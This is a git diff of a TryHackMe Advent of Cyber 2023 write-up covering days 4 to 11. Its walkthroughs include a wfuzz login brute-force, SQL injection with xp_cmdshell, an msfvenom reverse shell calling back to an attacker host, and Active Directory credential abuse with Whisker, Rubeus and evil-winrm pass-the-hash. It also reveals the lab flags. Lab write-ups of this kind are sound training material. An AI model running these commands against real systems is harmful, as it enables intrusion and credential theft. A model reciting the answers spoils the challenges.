@@ -182,11 +182,11 @@ In this task we will be using cewl to generate wordlists and wfuzz to brute-forc
    cewl 10.10.95.168 -d 2 -m 5 --with-numbers -w passwords.txt  
    ```
 
-   LISTS
+   ![Lists](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D4_Lists.png)
 
    Now we need to setup our `wfuzz` command. We just need to know what the error message is when logging in with incorrect credentials.
 
-   ERROR MESSAGE
+   ![Error Message](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D4_Error_Message.png)
 
    With this we can use `wfuzz` to find our login credentials.
 
@@ -194,7 +194,7 @@ In this task we will be using cewl to generate wordlists and wfuzz to brute-forc
    wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.95.168/login.php -d "username=FUZZ&password=FUZ2Z"
    ```
 
-   PASSWORD
+   ![Password](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D4_Password.png)
 
    ><details><summary>Click for answer</summary>isaias:Happiness</details>
 
@@ -202,7 +202,7 @@ In this task we will be using cewl to generate wordlists and wfuzz to brute-forc
 
    Now that we have our credentials, we can log into the application and have a look around. Perhaps one of the emails could contain some information.
 
-   FLAG
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D4_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{m3rrY4nt4rct1crAft$}</details>
 
@@ -210,31 +210,59 @@ If you enjoyed this task, feel free to check out the [Web Enumeration](https://t
 
 ### Day 5 A Christmas DOScovery: Tapes of Yule-tide Past
 
-
+In this task we will look at file signatures and how we can use them to using MsDOS.
 
 1. How large (in bytes) is the AC2023.BAK file?
 
+   After opening the DosBox executable we are greeting with the welcome screen.
 
+   ![DosBox](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D5_DosBox.png)
 
-   ><details><summary>Click for answer</summary></details>
+   We can now view the size of the backup file by using `dir`.
 
-2. What is the name of the backup program?
+   ![Size](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D5_Size.png)
 
+   ><details><summary>Click for answer</summary>12,704</details>
 
+3. What is the name of the backup program?
 
-   ><details><summary>Click for answer</summary></details>
+   In the backup folder we can find the Bumaster program, this name alone is not sufficient. So we can read the readme file to see if there is another name inside.
 
-3. What should the correct bytes be in the backup's file signature to restore the backup properly?
+   ![Name](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D5_Name.png)
 
+   ><details><summary>Click for answer</summary>BackupMaster3000</details>
 
+5. What should the correct bytes be in the backup's file signature to restore the backup properly?
 
-   ><details><summary>Click for answer</summary></details>
+   If we try to restore the file using the Bumaster program we get an error message about the file signature.
 
-4. What is the flag after restoring the backup successfully?
+   ```cmd
+   bumaster.exe C:\ac2023.bak
+   ```
 
+   ![Error](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D5_Error.png)
 
+   It mentions to read the readme file. Reading further into this file, we can see a section called troubleshooting which tells us which bytes the beginning of the file must contain.
 
-   ><details><summary>Click for answer</summary></details>
+   ![Troubleshooting](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D5_Troubleshooting.png)
+
+   ><details><summary>Click for answer</summary>41 43</details>
+
+7. What is the flag after restoring the backup successfully?
+
+   Using Cyberchef we can find out which characters we need to put at the beginning of the file.
+
+   ![Signature](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D5_Signature.png)
+
+   Opening the backup file, we can indeed see that the two bytes at the beginning of the file are wrong (XX).
+
+   ![File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D5_File.png)
+
+   Replacing 'XX' with 'AC' and re-running the command, we have successfully restored the backup.
+
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D5_Flag.png)
+
+   ><details><summary>Click for answer</summary>THM{0LD_5CH00L_C00L_d00D}</details>
 
 What you've done is a simple form of reverse engineering, but the topic has more than just this. If you are interested in learning more, we recommend checking out our [x64 Assembly Crash Course room](https://tryhackme.com/room/x86assemblycrashcourse), which offers a comprehensive guide to reverse engineering at the lowest level.
 
@@ -244,15 +272,74 @@ In this task we will be looking at how memory corruption through a buffer overfl
 
 1. If the coins variable had the in-memory value in the image below, how many coins would you have in the game?
 
-   ![Money]()
+   ![Memory](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D6_Memory.png)
 
-   ><details><summary>Click for answer</summary></details>
+   We can see the 4 bytes reprisenting the coin counter are 4f 4f 50 53.
+
+   We can use the 'from base' recipe in Cyberchef to convert this hex value to numbers (base 10). We must select base 16 as our source (hex).
+
+   Since the program uses Little Endian notation for the memory values, we must enter the bytes in reverse order.
+
+   ![Coins](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D6_Coins.png)
+
+   ><details><summary>Click for answer</summary>1397772111</details>
 
 2. What is the value of the final flag?
 
+   At the beginning of the game, we have one ornament and one coin. The computer can be used to gather more coins.
 
+   ![Game Begin](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D6_Game_Begin.png)
 
-   ><details><summary>Click for answer</summary></details>
+   Looking at the memory debug panel, we see the various variables and their contents such as our player name and coin count.
+
+   ![Game Inventory](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D6_Game_Inventory.png)
+
+   To check the buffer overflow vulnerability we should try a name that is longer that the amount of bytes that er reserverd in this game. In this case that would be 13 characters or more.
+
+   We could even choose a name that is 12 characters long and add some characters to get a coin count we can calculate beforehand.
+
+   `My Name Here` is 12 characters long. Using Cyberchef we can calculate how many coins the string `ab` would result in.
+
+   ![Game Extra](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D6_Game_Extra.png)
+
+   So changing our character name to `My Name Hereab` should result in 25185 coins.
+
+   First we must get enough coins and then we can change our name.
+
+   ![Game Name](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D6_Game_Name.png)
+
+   ![Game Inventory 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D6_Game_Inventory_2.png)
+
+   Success! Now we can try and buy ourselves a star to get the flag.
+
+   ![Game No Star](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D6_Game_No_Star.png)
+
+   Bummer, looks like it doesn't let us buy a star this way. Unfortunately, it takes away our coins and gives us some other ornament.
+
+   Perhaps we can give our character a name that would also give is a star. It must then be long enough to overflow all the way into the inventory memory.
+
+   Checking the ornament ID list we can see that a star has ID 'D'.
+
+   Lets create a character name that gives us a star and lamas, while leaving the names of our shopkeepers the same.
+
+   ```cmd
+   My Name Hereab Van Frosty  Van Holly   1234d44444444444444
+   |_____________||__________||__________|    ||____________|
+          v            v            v         v      v
+      my name       shop 1       shop 2     star    lamas
+   ```
+
+   ![Game Better Name](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D6_Game_Better_Name.png)
+
+   ![Game Success](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D6_Game_Success.png)
+
+   Success! Looks like we have an inventory full of lamas and a star.
+
+   Now lets head to the tree and get our flag.
+
+   ![Game Tree](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D6_Game_Tree.png)
+
+   ><details><summary>Click for answer</summary>THM{mchoneybell_is_the_real_star}</details>
 
 We have only explored the surface of buffer overflows in this task. Buffer overflows are the basis of many public exploits and can even be used to gain complete control of a machine. If you want to explore this subject more in-depth, feel free to check the [Buffer Overflows](https://tryhackme.com/room/bof1) room.
 
@@ -278,7 +365,7 @@ In this task we will be looking at how to parse log files to find information us
    cut -d ' ' -f2 access.log | sort | uniq | wc -l
    ```
 
-   UNIQUE IP
+   ![Unique Ip](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D7_Unique_Ip.png)
    
    ><details><summary>Click for answer</summary>9</details>
 
@@ -290,7 +377,7 @@ In this task we will be looking at how to parse log files to find information us
    cut -d ' ' -f3 access.log | cut -d ':' -f1 | sort | uniq | wc -l
    ```
    
-   UNIQUE DOMAINS
+   ![Unique Domains](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D7_Unique_Domains.png)
 
    ><details><summary>Click for answer</summary>111</details>
 
@@ -309,7 +396,7 @@ In this task we will be looking at how to parse log files to find information us
    grep 'partnerservices.getmicrosoftkey.com' access.log | cut -d ' ' -f6 | sort | uniq
    ```
 
-   STATUS CODE
+   ![Status Code](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D7_Status_Code.png)
 
    ><details><summary>Click for answer</summary>503</details>
 
@@ -322,7 +409,7 @@ In this task we will be looking at how to parse log files to find information us
    cut -d ' ' -f3 access.log | cut -d ':' -f1 | sort | uniq -c | sort -n | tail -10
    ```
    
-   MALICIOUS DOMAIN
+   ![Malicious Domain](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D7_Malicious_Domain.png)
    
    ><details><summary>Click for answer</summary>frostlings.bigbadstash.thm</details>
 
@@ -334,7 +421,7 @@ In this task we will be looking at how to parse log files to find information us
    grep 'frostlings.bigbadstash.thm' access.log | cut -d ' ' -f2 | sort | uniq
    ```
 
-   SOURCE IP
+   ![Source Ip](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D7_Source_Ip.png)
 
    ><details><summary>Click for answer</summary>10.10.185.225</details>
 
@@ -364,7 +451,7 @@ In this task we will be looking at how to parse log files to find information us
    grep 'frostlings.bigbadstash.thm' access.log | cut -d ' ' -f5 | cut -d '=' -f2 | base64 -d | grep '{'
    ```
 
-   FLAG
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D7_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{a_gift_for_you_awesome_analyst!}</details>
 
@@ -380,7 +467,7 @@ In this task we will be using FTK Imager to examine a malicious USB drive and re
 
    Opening it, we can see it is some sort of chat log containing information about the C2 server.
    
-   C2 SERVER
+   ![C2 Server](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D8_C2_Server.png)
 
    ><details><summary>Click for answer</summary>mcgreedysecretc2.thm</details>
 
@@ -388,7 +475,7 @@ In this task we will be using FTK Imager to examine a malicious USB drive and re
 
    We can see the deleted zip file. We can click on it to reveal its contents. Looks like there is a malicious executable within.
    
-   FILE
+   ![File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D8_File.png)
 
    ><details><summary>Click for answer</summary>JuicytomaTOY.exe</details>
 
@@ -398,11 +485,11 @@ In this task we will be using FTK Imager to examine a malicious USB drive and re
 
    However, one of the images seems to be somewhat corrupted. Perhaps someone messed with the bytes of the file. 
 
-   IMAGE
+   ![Image](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D8_Image.png)
 
    We can switch to using the hex-view mode to look at the bytes inside the image file. Using the search function we can look for `THM{`.
 
-   FLAG
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D8_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{byt3-L3vel_@n4Lys15}</details>
 
@@ -410,7 +497,7 @@ In this task we will be using FTK Imager to examine a malicious USB drive and re
 
    The has can be found by selecting the image in the file tree window and verifying the disk. This gives us another windows with various hashes.
    
-   HASH
+   ![Hash](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D8_Hash.png)
 
    ><details><summary>Click for answer</summary>39f2dea6ffb43bf80d80f19d122076b3682773c2</details>
 
@@ -424,7 +511,7 @@ In this task we will be be investigating the malware sample we found in the prev
 
    It seems all function we can find can be found in the main program section. Selecting this file, we can search it for any strings containing `agent`. This might give us the value of the useragent variable.
 
-   USER AGENT
+   ![User Agent](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D9_User_Agent.png)
 
    ><details><summary>Click for answer</summary>Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15</details>
 
@@ -432,11 +519,11 @@ In this task we will be be investigating the malware sample we found in the prev
 
    Looking at the main program, we can see which function is called to submit the results from executed commands (shell and implant).
 
-   SUBMIT FUNCTIONS
+   ![Submit Function](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D9_Submit_Function.png)
 
    Looks like it is using `PostIt` to submit the data. We can look at this function to find the HTTP request method used.
 
-   SUBMIT METHOD
+   ![Submit Method](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D9_Submit_Method.png)
 
    ><details><summary>Click for answer</summary>POST</details>
 
@@ -444,7 +531,7 @@ In this task we will be be investigating the malware sample we found in the prev
 
    We can find the this key by looking at the `decryptor` and `encryptor` function.
 
-   KEY
+   ![Key](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D9_Key.png)
 
    ><details><summary>Click for answer</summary>youcanthackthissupersecurec2keys</details>
 
@@ -452,7 +539,7 @@ In this task we will be be investigating the malware sample we found in the prev
 
    Firs this we should look at the main program file. Searching for `http` we can see where it is used first.
 
-   URL
+   ![Url](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D9_Url.png)
 
    Rember this is just the string containing part of the URL. The actual request (in GetIt) is don't with and additional argument.
 
@@ -464,7 +551,7 @@ In this task we will be be investigating the malware sample we found in the prev
 
    Searching for this variable gives us the harcoded value.
 
-   SLEEPER TIME
+   ![Sleep Time](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D9_Sleep_Time.png)
 
    ><details><summary>Click for answer</summary>15</details>
 
@@ -472,11 +559,11 @@ In this task we will be be investigating the malware sample we found in the prev
 
    Lets find out which function executes the `cmd` command on the machine. Looks like it is `ExecuteCommand`.
 
-   CMD FUNCTION
+   ![Cmd Function](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D9_Cmd_Function.png)
 
    We can now search for where this function is called in the main program.
 
-   CMD COMMAND
+   ![Cmd Command](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D9_Cmd_Command.png)
 
    Looks like it is called in the IF statement which looks for a particular string.
 
@@ -486,11 +573,11 @@ In this task we will be be investigating the malware sample we found in the prev
 
    Lets look in the `implant` function to see what is happening there.
 
-   EXECUTABLE
+   ![Executable](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D9_Executable.png)
 
    Looks like a spyware program is downloaded to a particular folder. It doesn't show us the download domain though. Lets search for where this function is called in the main program.
 
-   DROPPER URL
+   ![Dropper Url](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D9_Dropper_Url.png)
 
    Here we can see a URL being passed to the function containing the same spykit executable.
 
@@ -506,7 +593,7 @@ In this task we are looking into the defaced website and try to hack back into t
 
    When looking through the website, we can see there is a gift search page. Clicking the link, we can see the url for this form.
 
-   GIFT SEARCH
+   ![Gift Search](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Gift_Search.png)
 
    ><details><summary>Click for answer</summary>/giftsearch.php</details>
 
@@ -514,17 +601,17 @@ In this task we are looking into the defaced website and try to hack back into t
 
    After submitting a search query, we can see what paramters is used in the url.
 
-   GIFT URL
+   ![Gift Url](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Gift_Url.png)
 
    To check for any vulnerablities we can simply enter `'` for the first parameter.
 
-   ERROR
+   ![Error](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Error.png)
 
    This does indeed gives us an error. It also gives us some sensitive information.
 
    ><details><summary>Click for answer</summary>ODBC Driver 17 for SQL Server</details>
 
-4. Inject the 1=1 condition into the Gift Search form. What is the last result returned in the database?
+3. Inject the 1=1 condition into the Gift Search form. What is the last result returned in the database?
 
    Lets append the `1=1` condition to our injection. Dont' forget to use `--` at the end. This makes sure the rest of the query is ignored.
 
@@ -532,13 +619,13 @@ In this task we are looking into the defaced website and try to hack back into t
    ' OR 1=1 --
    ```
 
-   FLAG 1
+   ![Flag 1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Flag_1.png)
 
    Scrolling all the way to the bottom gives us the answer we are looking for.
 
    ><details><summary>Click for answer</summary>THM{a4ffc901c27fb89efe3c31642ece4447}</details>
 
-5. What flag is in the note file Gr33dstr left behind on the system?
+4. What flag is in the note file Gr33dstr left behind on the system?
 
    To get access to the underlying file system, we need to perform several steps.
 
@@ -548,7 +635,7 @@ In this task we are looking into the defaced website and try to hack back into t
    EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
    ```
 
-   ENABLE XPCMD
+   ![Enable Xpcmd](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Enable_Xpcmd.png)
 
    The next thing to do is prepare our reverse shell using msfvenom.
 
@@ -556,7 +643,7 @@ In this task we are looking into the defaced website and try to hack back into t
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f exe -o gift.exe
    ```
 
-   SHELL
+   ![Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Shell.png)
    
    Using `xp_cmdshell` and `certutil` we can transfer this file to the server using the SQL injection we just found.
 
@@ -572,11 +659,11 @@ In this task we are looking into the defaced website and try to hack back into t
    **Unfortunately, I am getting errors when trying to transfer the file. Although it seems to send a request to the python server, executing the file doesn't seem to give me a connection.**
    ##
    
-   GIFT UPLOAD ERROR
+   ![Gift Upload Error](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Gift_Upload_Error.png)
 
    I had to use the attack box instead to upload the shell. This did work without any errors.
 
-   GIFT UPLOAD   
+   ![Gift Upload](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Gift_Upload.png)
 
    I wanted to see if only the transfer of the file was problematic. So I setup a listener on my kali box using:
 
@@ -590,15 +677,15 @@ In this task we are looking into the defaced website and try to hack back into t
    '; EXEC xp_cmdshell 'C:\Windows\Temp\gift.exe';--
    ```
 
-   SHELL CONNECTION
+   ![Shell Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Shell_Connection.png)
 
    Success! We see we are indeed logged into the system. We can now start looking for the Note in the Administrator folder.
 
-   NOTE SEARCH
+   ![Note Search](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Note_Search.png)
    
    Looks like the note is located in the Desktop folder. Opening it, we see it is a note from Gr33dstr with a flag.
 
-   NOTE FLAG
+   ![Note Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Note_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{b06674fedd8dfc28ca75176d3d51409e}</details>
 
@@ -606,7 +693,7 @@ In this task we are looking into the defaced website and try to hack back into t
 
    The final step is the restore the original website and retrieve our flag.
 
-   FILES
+   ![Files](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Files.png)
    
    In the Admin folder there is another file called `restore_website.bat`, this is probably what we are looking for judging from its content. Lets run it!
 
@@ -614,11 +701,11 @@ In this task we are looking into the defaced website and try to hack back into t
    restore_website.bat
    ```
 
-   RESTORE SCRIPT
+   ![Restore Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Restore_Script.png)
 
    Now we simply refresh the webpage and we should be greeted with our final flag.
 
-   RESTORE FLAG
+   ![Restore Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D10_Restore_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{4cbc043631e322450bc55b42c}</details>
 
@@ -648,7 +735,7 @@ In this task we will utilize misconfigured privileges to compromise an Active Di
    Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr"}
    ```
 
-   USER PRIVILEGES
+   ![User Privileges](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D11_User_Privileges.png)
 
    We can see that the `hr` account has write permissions for the `vansprinkles` object (account).
 
@@ -658,7 +745,7 @@ In this task we will utilize misconfigured privileges to compromise an Active Di
    .\whisker.exe add /target:vansprinkles
    ```
 
-   WHISKER
+   ![Whisker](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D11_Whisker.png)
 
    The resulting command we can use to get the NTLM hash with `Rubeus`.
 
@@ -666,7 +753,7 @@ In this task we will utilize misconfigured privileges to compromise an Active Di
     .\Rubeus.exe asktgt /user:vansprinkles /certificate:<base64 encoded certificate> /password:"AG1sF7Nd1nAwZ2hZ" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show
    ```
 
-   RUBEUS
+   ![Rubeus](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D11_Rubeus.png)
 
    ><details><summary>Click for answer</summary>03E805D8A8C5AA435FB48832DAD620E3</details>
 
@@ -678,15 +765,15 @@ In this task we will utilize misconfigured privileges to compromise an Active Di
    evil-winrm -i 10.10.163.140 -u vansprinkles -H 03E805D8A8C5AA435FB48832DAD620E3
    ```
 
-   WINRM ERROR
+   ![Winrm Error](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D11_Winrm_Error.png)
 
    Unfortunately, it didn't work via my kali box. Using the attackbox did work!
 
-   WINRM
+   ![Winrm](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D11_Winrm.png)
 
    Now we can navigate to the desktop and look for the flag.
 
-   FLAG
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D11_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{XMAS_IS_SAFE}</details>
 
@@ -709,7 +796,7 @@ Now set up a python http server and download the files to our kali box using `wg
 
 Looking at the chatlogs in our browser, we can see some interesting information. Looks like it is a chat log between McGreedy and someone who made the evil company logo.
 
-CHATLOG
+![Chatlog](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2023/Advent_Of_Cyber_2023_D11_Chatlog.png)
 
 ##
 
